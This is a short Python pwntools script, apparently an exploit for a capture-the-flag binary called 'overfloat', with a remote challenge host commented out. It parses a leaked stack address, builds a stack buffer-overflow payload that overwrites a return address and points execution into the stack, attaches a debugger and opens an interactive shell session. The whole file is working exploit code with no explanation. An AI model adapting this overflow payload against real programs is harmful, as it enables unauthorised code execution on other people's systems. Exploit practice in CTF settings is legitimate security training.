#coding:utf-8
from pwn import *
context.log_level = 'debug'
# sh = remote("114.67.246.176",12159)
sh = process("./overfloat")
sh.recvuntil("s的地址:0x")
stack_addr = int(sh.recv(12),16)
log.info("stack_addr".format(stack_addr))
payload = p64(0x40071b)
payload = payload.ljust(240,"a")
payload += p64(stack_addr+8)
print(payload)
gdb.attach(sh,"b *0x40071a")
pause()
sh.send(payload)
sh.interactive() 